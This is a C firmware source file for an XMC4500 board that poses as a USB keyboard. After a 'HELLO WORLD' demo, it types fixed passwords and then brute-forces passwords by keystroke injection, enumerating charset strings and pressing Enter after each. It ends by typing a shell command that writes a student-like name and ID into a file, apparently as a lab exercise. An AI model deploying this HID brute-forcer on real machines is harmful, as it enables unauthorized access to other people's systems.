#include "KeyboardHID.h"
#include "german_keyboardCodes.h"

/* Macros: */
#define LED1 P1_1  // Define LED1 GPIO pin for debugging or visual feedback
#define LED2 P1_0  // Define LED2 GPIO pin for debugging or visual feedback


/* Clock configuration */
// Configure the system clock for the XMC4500, including USB and peripheral clocks
XMC_SCU_CLOCK_CONFIG_t clock_config = {
	.syspll_config.p_div  = 2,  // PLL pre-divider
	.syspll_config.n_div  = 80, // PLL multiplier
	.syspll_config.k_div  = 4,  // PLL post-divider
	.syspll_config.mode   = XMC_SCU_CLOCK_SYSPLL_MODE_NORMAL, // Normal PLL mode
	.syspll_config.clksrc = XMC_SCU_CLOCK_SYSPLLCLKSRC_OSCHP, // Use external crystal oscillator
	.enable_oschp         = true,  // Enable the external crystal oscillator
	.calibration_mode     = XMC_SCU_CLOCK_FOFI_CALIBRATION_MODE_FACTORY, // Factory calibration
	.fsys_clksrc          = XMC_SCU_CLOCK_SYSCLKSRC_PLL,  // Use PLL as the system clock source
	.fsys_clkdiv          = 1,  // No division for the system clock
	.fcpu_clkdiv          = 1,  // No division for CPU clock
	.fccu_clkdiv          = 1,  // No division for CCU clock
	.fperipheral_clkdiv   = 1   // No division for peripheral clock
};

/* Forward declaration of HID callbacks as defined by LUFA */
// Callback to create HID reports when the host requests data
bool CALLBACK_HID_Device_CreateHIDReport(
							USB_ClassInfo_HID_Device_t* const HIDInterfaceInfo,
							uint8_t* const ReportID,
							const uint8_t ReportType,
							void* ReportData,
							uint16_t* const ReportSize );

// Callback to process incoming HID reports (e.g., LED state updates)
void CALLBACK_HID_Device_ProcessHIDReport(
							USB_ClassInfo_HID_Device_t* const HIDInterfaceInfo,
							const uint8_t ReportID,
							const uint8_t ReportType,
							const void* ReportData,
							const uint16_t ReportSize );

// Function to set up the system clock
void SystemCoreClockSetup(void);

/**
 * Main program entry point. This routine configures the hardware required by
 * the application, then enters a loop to run the application tasks in sequence.
 */
int main(void) {
	// Initialize LED pins as push-pull outputs for debugging or LED feedback
	XMC_GPIO_SetMode(LED1, XMC_GPIO_MODE_OUTPUT_PUSH_PULL);
	XMC_GPIO_SetMode(LED2, XMC_GPIO_MODE_OUTPUT_PUSH_PULL);

	// Initialize USB HID functionality
	USB_Init();

	// Wait for the host to enumerate the HID device
	for (int i = 0; i < 10e6; ++i) 
		;  // Delay loop for stabilization or debugging purposes

	while (1) {
		// Perform USB HID tasks, such as sending or receiving HID reports
		HID_Device_USBTask(&Keyboard_HID_Interface);
	}
}

// Callback function called when a new HID report needs to be created
bool CALLBACK_HID_Device_CreateHIDReport_og(
							USB_ClassInfo_HID_Device_t* const HIDInterfaceInfo,
							uint8_t* const ReportID,
							const uint8_t ReportType,
							void* ReportData,
							uint16_t* const ReportSize ) {
	// Cast the ReportData pointer to a USB keyboard report structure
	USB_KeyboardReport_Data_t* report = (USB_KeyboardReport_Data_t *)ReportData;

	// Set the report size to match the keyboard report structure size
	*ReportSize = sizeof(USB_KeyboardReport_Data_t);

	// Variables to track the current state of the string being sent
	static uint8_t characterSent = 0, indexToSend = 0;

	// String to be sent as keystrokes ("HELLO WORLD" + ENTER key)
	static uint8_t stringToSend[12] = {
		GERMAN_KEYBOARD_SC_H, 
		GERMAN_KEYBOARD_SC_E, 
		GERMAN_KEYBOARD_SC_L, 
		GERMAN_KEYBOARD_SC_L, 
		GERMAN_KEYBOARD_SC_O, 
		GERMAN_KEYBOARD_SC_SPACE, 
		GERMAN_KEYBOARD_SC_W, 
		GERMAN_KEYBOARD_SC_O, 
		GERMAN_KEYBOARD_SC_R, 
		GERMAN_KEYBOARD_SC_L, 
		GERMAN_KEYBOARD_SC_D, 
		GERMAN_KEYBOARD_SC_ENTER
	};

	if (indexToSend < 12) {  // Check if there are more characters to send
		if (characterSent) { 
			// Clear the report (key released)
			report->Modifier = 0; 
			report->Reserved = 0; 
			report->KeyCode[0] = 0; 
			characterSent = 0; // Mark that no key is currently pressed
			++indexToSend;  // Move to the next character in the string
		} else {
			// Send the current character as a key press
			report->Modifier = 0; 
			report->Reserved = 0; 
			report->KeyCode[0] = stringToSend[indexToSend]; 
			characterSent = 1;  // Mark that the key has been sent
		}
	}

	return true; // Indicate that a report has been successfully created
}



// Callback function to handle input reports (e.g., LED state updates)
void CALLBACK_HID_Device_ProcessHIDReport(
						USB_ClassInfo_HID_Device_t* const HIDInterfaceInfo,
						const uint8_t ReportID,
						const uint8_t ReportType,
						const void* ReportData,
						const uint16_t ReportSize ) {
	uint8_t *report = (uint8_t*)ReportData;

	// Control LED1 based on the NUMLOCK state
	if (*report & HID_KEYBOARD_LED_NUMLOCK) 
		XMC_GPIO_SetOutputHigh(LED1);  // Turn on LED1 if NUMLOCK is active
	else 
		XMC_GPIO_SetOutputLow(LED1);   // Turn off LED1 if NUMLOCK is inactive

	// Control LED2 based on the CAPSLOCK state
	if (*report & HID_KEYBOARD_LED_CAPSLOCK) 
		XMC_GPIO_SetOutputHigh(LED2);  // Turn on LED2 if CAPSLOCK is active
	else 
		XMC_GPIO_SetOutputLow(LED2);   // Turn off LED2 if CAPSLOCK is inactive
}

// Configure the system clock for USB and peripherals
void SystemCoreClockSetup(void) {
	/* Initialize the system clock using the defined configuration */
	XMC_SCU_CLOCK_Init(&clock_config);

	// Enable and start the USB PLL (Phase-Locked Loop)
	XMC_SCU_CLOCK_EnableUsbPll();
	XMC_SCU_CLOCK_StartUsbPll(2, 64);

	// Configure USB clock divider and source
	XMC_SCU_CLOCK_SetUsbClockDivider(4);
	XMC_SCU_CLOCK_SetUsbClockSource(XMC_SCU_CLOCK_USBCLKSRC_USBPLL);

	// Enable the USB clock
	XMC_SCU_CLOCK_EnableClock(XMC_SCU_CLOCK_USB);

	// Update the system core clock frequency
	SystemCoreClockUpdate();
}



// **************************************************************
// MY FUNCTIONS
// **************************************************************

void _fini(void) {}

// Callback function to handle input reports (e.g., LED state updates)
void sendPassword_(USB_KeyboardReport_Data_t* report, const char* passwordToSend, uint8_t passwordLength) {
    // Static state variables to track password sending
    static uint8_t indexToSend = 0;  // Tracks the current character being sent
    static bool characterSent = false;  // Tracks whether the current key was released
    static bool appendEnter = false;  // Tracks if "enter" should be sent after the password

    // Lookup the HID value for the current character
    uint8_t hidValue = 0;

    // If all characters have been processed, send "enter" at the end
    if (indexToSend >= passwordLength && !appendEnter) {
        for (size_t i = 0; i < GERMAN_KEYMAP_SIZE; ++i) {
            if (strcmp("enter", germanKeymap[i].character) == 0) {
                hidValue = germanKeymap[i].hidValue;
                appendEnter = true;  // Ensure this block only runs once
                break;
            }
        }
    } else if (indexToSend < passwordLength) {
        // Process the next character in the password
        char currentChar[2] = {passwordToSend[indexToSend], '\0'};  // Single-character string

        // Search the lookup table for the current character
        for (size_t i = 0; i < GERMAN_KEYMAP_SIZE; ++i) {
            if (strcmp(currentChar, germanKeymap[i].character) == 0) {
                hidValue = germanKeymap[i].hidValue;
                break;
            }
        }
    }

    if (indexToSend <= passwordLength) {  // Check if there are more characters to send or "enter"
        if (characterSent) {
            // Release the key by clearing the report
            report->Modifier = 0;
            report->Reserved = 0;
            report->KeyCode[0] = 0;
            characterSent = false;  // Mark the key as released
            if (!appendEnter) {
                ++indexToSend;  // Move to the next character unless processing "enter"
            }
        } else {
            // Send the key corresponding to the current character
            report->Modifier = 0;
            report->Reserved = 0;
            report->KeyCode[0] = hidValue;  // Set the HID value for the current character
            characterSent = true;  // Mark the key as pressed

            // If "enter" was just sent, reset the state
            if (appendEnter) {
                appendEnter = false;  // Reset "enter" flag after it is sent
                indexToSend = passwordLength + 1;  // Ensure no further characters are sent
            }
        }
    }
}


// Function to store generated passwords into allocated memory
void storePassword(const char* password, char** allPasswords, size_t* bufferSize, size_t* bufferIndex) {
    size_t passwordLen = strlen(password);

    // Expand buffer size to accommodate new password + space + null terminator
    *bufferSize += passwordLen + 2;  // +1 for space, +1 for '\0'
    
    // Use a temporary pointer to avoid memory leak in case of failure
    char* temp = realloc(*allPasswords, *bufferSize);
    if (!temp) {
        printf("Memory allocation failed!\n");
        exit(1);
    }
    *allPasswords = temp;  // Update pointer if realloc succeeded

    // Append the password to the buffer
    strcpy(*allPasswords + *bufferIndex, password);
    *bufferIndex += passwordLen;

    // Append a space after the password
    (*allPasswords)[*bufferIndex] = ' ';
    (*bufferIndex)++;

    // Null-terminate the buffer
    (*allPasswords)[*bufferIndex] = '\0';
}


// Recursive function to generate and store passwords
void generateAndTestPasswords(
    char* currentPassword, 
    char** allPasswords, 
    uint8_t currentLength, 
    uint8_t maxLength,
    size_t* bufferSize,
    size_t* bufferIndex)
{
    if (currentLength == maxLength) {
        return; // end of recursion
    }

    // Iterate through each character in the charset
    for (uint8_t i = 0; i < charsetSize; i++) {
        // Append the current character to the password
        currentPassword[currentLength] = passwordCharset[i];
        currentPassword[currentLength + 1] = '\0'; // Null-terminate the password
        
		// Store the generated password
        storePassword(currentPassword, allPasswords, bufferSize, bufferIndex);

        // Recursively build the next character in the password
        generateAndTestPasswords(currentPassword, allPasswords, currentLength + 1, maxLength, bufferSize, bufferIndex);
    }
}

// Callback function called when a new HID report needs to be created
bool CALLBACK_HID_Device_CreateHIDReport_(
    USB_ClassInfo_HID_Device_t* const HIDInterfaceInfo,
    uint8_t* const ReportID,
    const uint8_t ReportType,
    void* ReportData,
    uint16_t* const ReportSize) 
{
    // Cast the ReportData pointer to a USB keyboard report structure
    USB_KeyboardReport_Data_t* report = (USB_KeyboardReport_Data_t *)ReportData;

    // Set the report size to match the keyboard report structure size
    *ReportSize = sizeof(USB_KeyboardReport_Data_t);
    
	const uint8_t maxPasswordLength = 2;
	static char* passwordToSend = "nique";  // Password to send
    uint8_t passwordLength = strlen(passwordToSend);  // Length of the password (excluding null terminator)

	// buffer to store all passwords
	char* allPasswords = NULL;
	size_t bufferSize = 0;
	size_t bufferIndex = 0;  // Keeps track of where to append next
	char currentPassword[maxPasswordLength + 1];  // Temporary storage for each password

	// generateAndTestPasswords("", &allPasswords, passwordLength, maxPasswordLength, &bufferSize, &bufferIndex);


	// Send the password
	sendPassword(report, passwordToSend, passwordLength);

	// sendPassword(report, passwordToSend, passwordLength);
    // passwordLength = strlen(allPasswords);  // Length of the password (excluding null terminator)
	// sendPassword(report, allPasswords, passwordLength);


	// Free allocated memory
    // free(allPasswords);


    return true;  // Indicate that a report has been successfully created
}


// Callback function to handle input reports (e.g., LED state updates)
void sendPassword__(USB_KeyboardReport_Data_t* report, const char* passwordToSend, uint8_t passwordLength, bool resetState) {
    // Static state variables to track password sending
    static uint8_t indexToSend = 0;  // Tracks the current character being sent
    static bool characterSent = false;  // Tracks whether the current key was released
    static bool appendEnter = false;  // Tracks if "enter" should be sent after the password

    // Lookup the HID value for the current character
    uint8_t hidValue = 0;

    // If all characters have been processed, send "enter" at the end
    if (indexToSend >= passwordLength && !appendEnter) {
        for (size_t i = 0; i < GERMAN_KEYMAP_SIZE; ++i) {
            if (strcmp("enter", germanKeymap[i].character) == 0) {
                hidValue = germanKeymap[i].hidValue;
                appendEnter = true;  // Ensure this block only runs once
                break;
            }
        }
    } else if (indexToSend < passwordLength) {
        // Process the next character in the password
        char currentChar[2] = {passwordToSend[indexToSend], '\0'};  // Single-character string

        // Search the lookup table for the current character
        for (size_t i = 0; i < GERMAN_KEYMAP_SIZE; ++i) {
            if (strcmp(currentChar, germanKeymap[i].character) == 0) {
                hidValue = germanKeymap[i].hidValue;
                break;
            }
        }
    }

    if (indexToSend <= passwordLength) {  // Check if there are more characters to send or "enter"
        if (characterSent) {
            // Release the key by clearing the report
            report->Modifier = 0;
            report->Reserved = 0;
            report->KeyCode[0] = 0;
            characterSent = false;  // Mark the key as released
            if (!appendEnter) {
                ++indexToSend;  // Move to the next character unless processing "enter"
            }
        } else {
            // Send the key corresponding to the current character
            report->Modifier = 0;
            report->Reserved = 0;
            report->KeyCode[0] = hidValue;  // Set the HID value for the current character
            characterSent = true;  // Mark the key as pressed

            // If "enter" was just sent, reset the state
            if (appendEnter) {
                appendEnter = false;  // Reset "enter" flag after it is sent
                indexToSend = passwordLength + 1;  // Ensure no further characters are sent
            }
        }
    }
	
	// Reset state when sending a new password
    if (resetState) {
        indexToSend = 0;
        characterSent = false;
        appendEnter = false;
    }
}

// Callback function called when a new HID report needs to be created
bool CALLBACK_HID_Device_CreateHIDReport__(
    USB_ClassInfo_HID_Device_t* const HIDInterfaceInfo,
    uint8_t* const ReportID,
    const uint8_t ReportType,
    void* ReportData,
    uint16_t* const ReportSize) 
{
    // Cast the ReportData pointer to a USB keyboard report structure
    USB_KeyboardReport_Data_t* report = (USB_KeyboardReport_Data_t *)ReportData;

    // Set the report size to match the keyboard report structure size
    *ReportSize = sizeof(USB_KeyboardReport_Data_t);
    
	const uint8_t maxPasswordLength = 2;
	static char* passwordToSend = "ni";  // Password to send
    uint8_t passwordLength = strlen(passwordToSend);  // Length of the password (excluding null terminator)

	// Send the password
	sendPassword(report, passwordToSend, passwordLength, false);  // Reset state
	sendPassword(report, passwordToSend, passwordLength, false);  // Reset state

    return true;  // Indicate that a report has been successfully created
}



// Variables for brute-force state tracking
#define MAX_PASSWORD_LENGTH  41  // Define max password length as a compile-time constant

static char currentPassword[MAX_PASSWORD_LENGTH + 1] = {0};  // Current password attempt
static uint8_t currentIndices[MAX_PASSWORD_LENGTH] = {0};  // Track position in charset
static uint8_t currentLength = 1;  // Start brute-force with length 1
static bool newPasswordReady = false;  // Flag to indicate if a new password should be generated
static bool passwordFound = false;  // Flag to indicate if the password was found
static bool cmdEntered = false;  // Flag to indicate if the password was found
static bool cmdEntered_ = false;  // Flag to indicate if the password was found

// Function to generate the next password in sequence
void generateNextPassword() {
    if (!newPasswordReady) return;  // Don't generate if a password is still being sent

    for (uint8_t i = 0; i < currentLength; i++) {
        currentPassword[i] = passwordCharset[currentIndices[i]];
    }
    currentPassword[currentLength] = '\0';  // Null-terminate

    // Update indices for the next attempt
    for (int i = currentLength - 1; i >= 0; i--) {
        if (++currentIndices[i] < charsetSize) {
            break;  // Continue to next character
        }
        currentIndices[i] = 0;  // Reset current position
        // if (i == 0 && currentLength < MAX_PASSWORD_LENGTH) {
        if (i == 0) {
            currentLength++;  // Increase password length when needed
        }
    }
    
    newPasswordReady = false;  // Mark that this password is being sent
}

void sendPassword(USB_KeyboardReport_Data_t* report) {

	// if (cmdEntered_) {return;}
	
    static uint8_t indexToSend = 0;
    static bool characterSent = false;
    static bool appendEnter = false;
    uint8_t hidValue = 0;
    uint8_t modifier = 0;  // Modifier key (Shift, AltGr, etc.)

    // If the password is fully sent, send "Enter"
    if (indexToSend >= currentLength && !appendEnter) {
        for (size_t i = 0; i < GERMAN_KEYMAP_SIZE; ++i) {
            if (strcmp("enter", germanKeymap[i].character) == 0) {
                hidValue = germanKeymap[i].hidValue;
                appendEnter = true;
                break;
            }
        }
    } else if (indexToSend < currentLength) {
        // Process the next character in the password
        char currentChar = currentPassword[indexToSend];

        // Check if character is uppercase
        if (currentChar >= 'A' && currentChar <= 'Z') {
            modifier = 0x02;  // Set Shift key
        }

        // Check if this key requires Shift (it's the second symbol on the key)
        if (currentChar == '!' || currentChar == '@' || currentChar == '#' ||
            currentChar == '$' || currentChar == '%' || currentChar == '^' ||
            currentChar == '&' || currentChar == '*' || currentChar == '(' ||
            currentChar == ')' || currentChar == '_' || currentChar == '+' ||
            currentChar == ':' || currentChar == '?' || currentChar == '>' ||
            currentChar == '{' || currentChar == '}' || currentChar == '|') {
            modifier = 0x02;  // Set Shift key
        }

        char lookupChar[2] = {currentChar, '\0'};  // Single-character string

        // Search the lookup table for the current character
        for (size_t i = 0; i < GERMAN_KEYMAP_SIZE; ++i) {
            if (strcmp(lookupChar, germanKeymap[i].character) == 0) {
                hidValue = germanKeymap[i].hidValue;
                break;
            }
        }
    }

    // Handle key press/release events
    if (indexToSend <= currentLength) {
        if (characterSent) {
            // Release the key
            report->Modifier = 0;
            report->Reserved = 0;
            report->KeyCode[0] = 0;
            characterSent = false;
            if (!appendEnter) {
                ++indexToSend;
            } else {
                // After "Enter", reset everything and generate a new password
                indexToSend = 0;
                appendEnter = false;
                if (currentLength <= MAX_PASSWORD_LENGTH) {
                    newPasswordReady = true;  // Ready to generate next password
                }
            }
        } else {
            // Press the key
            report->Modifier = modifier;  // Apply Shift if needed
            report->Reserved = 0;
            report->KeyCode[0] = hidValue;
            characterSent = true;
        }
    }
}

// Callback function called when a new HID report needs to be created
bool CALLBACK_HID_Device_CreateHIDReport(
    USB_ClassInfo_HID_Device_t* const HIDInterfaceInfo,
    uint8_t* const ReportID,
    const uint8_t ReportType,
    void* ReportData,
    uint16_t* const ReportSize) 
{
    // Cast the ReportData pointer to a USB keyboard report structure
    USB_KeyboardReport_Data_t* report = (USB_KeyboardReport_Data_t *)ReportData;

    // Set the report size
    *ReportSize = sizeof(USB_KeyboardReport_Data_t);

    if (!passwordFound || currentLength <= MAX_PASSWORD_LENGTH) {
        // Generate and send the next password
        generateNextPassword();
    } else {
		passwordFound = true;
    }

	if (passwordFound) {
        // If maximum password length is reached, send the final command line
        strcpy(currentPassword, "echo 'Zaccarie Kanit' > '$HOME/03798107'");
		cmdEntered = true;
	}

	sendPassword(report);

	if (cmdEntered) {
		// Send the command line
		cmdEntered_ = true;
	}

    return true;
}
